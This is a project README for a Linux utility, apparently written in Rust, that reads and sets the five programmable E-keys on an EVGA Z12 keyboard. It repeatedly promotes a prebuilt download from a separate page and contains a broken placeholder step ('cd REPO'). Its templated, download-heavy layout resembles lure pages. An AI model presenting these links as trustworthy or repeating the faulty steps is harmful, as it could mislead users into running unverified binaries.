# EVGA Z12 Keys v1.0.0 - Linux Keyboard Configuration Utility 2026

> **EVGA Z12 Keys is a compact Rust application for Linux that reads and configures the five programmable E-keys found on the EVGA Z12 keyboard.**

[![Platform](https://img.shields.io/badge/Platform-Linux-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/erik-berger350/evga-z12-keys-linux?style=flat-square)](https://github.com/erik-berger350/evga-z12-keys-linux)

---

<p align="center">
  <a href="https://erik-berger350.github.io/evga-z12-keys-linux/">
    <img src="https://img.shields.io/badge/Download-EVGA%20Z12%20Keys%20Latest-brightgreen?style=for-the-badge" alt="Download EVGA Z12 Keys">
  </a>
</p>

> **[Download EVGA Z12 Keys v1.0.0](https://erik-berger350.github.io/evga-z12-keys-linux/)**

---

[Download Latest Build](https://erik-berger350.github.io/evga-z12-keys-linux/)

---

## Overview

EVGA Z12 Keys offers a simple Linux-based way to manage the programmable E-keys on an EVGA Z12 keyboard. Using the keyboard's HID interface, it can display existing assignments and apply new ones.

Instead of relying on a full desktop configuration suite, the utility focuses specifically on E-key management. You can work with a single key, turn selected keys off, or use automatic configuration for all five keys. Before changes are sent, requested key names are validated, and successful updates are stored in the keyboard's active onboard profile.

---

## Capabilities

- Manage all five programmable E-keys on the EVGA Z12
- Inspect the assignment currently associated with each E-key
- Update one E-key while leaving the remaining keys unchanged
- Apply configuration to the entire E-key group automatically
- Turn off an individual E-key
- Turn off every programmable E-key
- Check key names before sending modifications
- Save modifications to the keyboard's active onboard profile

---

## Installation

### Download a prebuilt version

Linux builds are available from the project download page:

[Download EVGA Z12 Keys](https://erik-berger350.github.io/evga-z12-keys-linux/)

Once the file is downloaded, add execute permission when required and start it from a terminal.

### Compile with Cargo

Fetch the source and move into the repository:

    git clone https://github.com/erik-berger350/evga-z12-keys-linux.git
    cd REPO

Create an optimized release build:

    cargo build --release

Cargo places the resulting executable in:

    target/release/

The EVGA Z12 should be connected before launching the utility.

---

## Running the Utility

For a normal configuration session:

1. Attach the EVGA Z12 keyboard to the Linux computer.
2. Launch EVGA Z12 Keys in a terminal.
3. Examine the assignments currently set for the E-keys.
4. Choose either a specific E-key or the mode that handles the complete keyboard configuration.
5. Provide the desired key name.
6. Let the utility verify that the name is supported.
7. Write the update to the active onboard profile.

From a checked-out source tree, display the available interface with:

    cargo run -- --help

The help output lists the commands and arguments used to inspect, assign, and disable E-keys.

---

## Configuration Details

The utility communicates with the keyboard directly over HID. Configuration changes are saved to the EVGA Z12's active onboard profile, rather than being kept only in local application settings.

To see the accepted configuration format and available options, run:

    evga-z12-keys --help

For a source build, use:

    cargo run -- --help

---

## System Requirements

- Linux
- An EVGA Z12 keyboard
- Access to the keyboard's HID interface
- Rust and Cargo for source compilation
- A USB connection to the EVGA Z12
- Appropriate permissions for the HID device

If the keyboard does not appear, verify the USB connection and check Linux permissions for the applicable HID device before trying again.

---

## Frequently Asked Questions

### What hardware is supported?

EVGA Z12 Keys is intended for the EVGA Z12 keyboard, including its five programmable E-keys.

### Can the current E-key mappings be inspected?

Yes. The utility reports the existing assignment for each programmable E-key.

### Can I modify a single key only?

Yes. An individual E-key may be assigned a new key or disabled without changing the others.

### Does the tool support configuring all five keys together?

Yes. Automatic configuration mode can process the complete set of five programmable E-keys.

### What if the key name is not supported?

The utility checks the requested name before applying the update. If validation fails, consult the command help and enter a supported key name.

### Where does the utility store assignments?

Changes are written directly to the keyboard's active onboard profile.

### What should I check if the keyboard is not found?

Make sure the EVGA Z12 is connected, confirm that Linux provides access to its HID interface, and use the utility's help or diagnostic options from a terminal.

### Where can I find newer versions?

Visit the repository and download page for release details and updated builds:

[View the project](https://github.com/erik-berger350/evga-z12-keys-linux)

---

## License

This project is released under the GNU GPL v3.0. See [LICENSE](LICENSE) for the full license text.
